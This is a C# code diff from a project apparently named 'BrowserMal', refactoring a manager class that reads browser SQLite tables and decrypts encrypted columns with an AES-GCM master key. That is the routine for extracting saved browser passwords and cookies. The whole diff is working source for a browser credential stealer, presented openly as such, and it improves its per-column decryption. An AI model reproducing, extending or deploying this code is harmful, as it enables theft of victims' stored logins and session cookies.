@@ -5,22 +5,20 @@ using BrowserMal.Util;
 using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
 using BrowserMal.SQLite;
+using BrowserMal.Model;
 
 namespace BrowserMal.Manager
 {
     public class GenericManager<T>
     {
         private readonly string tableName;
-        private readonly string[] columnNames;
-        private readonly bool lastArgEncrypted;
+        private readonly SqliteTableModel sqliteTableModel;
 
-        public GenericManager(string tableName, string[] columnNames, bool lastArgEncrypted)
+        public GenericManager(string tableName, SqliteTableModel sqliteTableModel)
         {
             this.tableName = tableName;
-            this.columnNames = columnNames;
-            this.lastArgEncrypted = lastArgEncrypted;
+            this.sqliteTableModel = sqliteTableModel;
         }
 
         public void Init(ref List<BrowserModel> browsers, string profileType)
@@ -80,10 +78,10 @@ namespace BrowserMal.Manager
             {
                 try
                 {
-                    string[] values = GrabSqliteValues(columnNames, ref sqLiteHandler, i, masterKey);
+                    string[] values = GrabSqliteValues(sqliteTableModel.GetColumns(), ref sqLiteHandler, i, masterKey);
 
-                    if (string.IsNullOrEmpty(values.Last()) && lastArgEncrypted)
-                        continue;
+                    /*if (string.IsNullOrEmpty(values.Last()) && lastArgEncrypted)
+                        continue;*/
 
                     T obj = CreateInstanceOfType(values);
                     generic.Add(obj);
@@ -95,22 +93,30 @@ namespace BrowserMal.Manager
             return generic;
         }
 
-        private string[] GrabSqliteValues(string[] columns, ref SqliteHandler sqLiteHandler, int row, byte[] masterKey)
+        private string[] GrabSqliteValues(List<ColumnModel> columns, ref SqliteHandler sqLiteHandler, int row, byte[] masterKey)
         {
-            string[] values = new string[columns.Length];
+            string[] values = new string[columns.Count];
 
-            for (int i = 0; i < columns.Length; i++)
+            for (int i = 0; i < columns.Count; i++)
             {
-                // last value
-                if (i == columnNames.Length - 1 && lastArgEncrypted)
+                string value;
+                if (columns[i].IsEncrypted())
                 {
-                    values[i] = AesGcm256.GetEncryptedValue(sqLiteHandler.GetValue(row, columns[i]), masterKey);
-                    break;
+                    value = AesGcm256.GetEncryptedValue(sqLiteHandler.GetValue(row, columns[i].GetName()), masterKey);
+                }
+                else
+                {
+                    value = sqLiteHandler.GetValue(row, columns[i].GetName());
                 }
 
-                values[i] = sqLiteHandler.GetValue(row, columns[i]);
+                if (columns[i].IsNeedsFormatting())
+                {
+                    values[i] = (string)columns[i].Format(value);
+                    continue;
+                }
+                values[i] = value;
             }
-
+           
             return values;
         }
     }
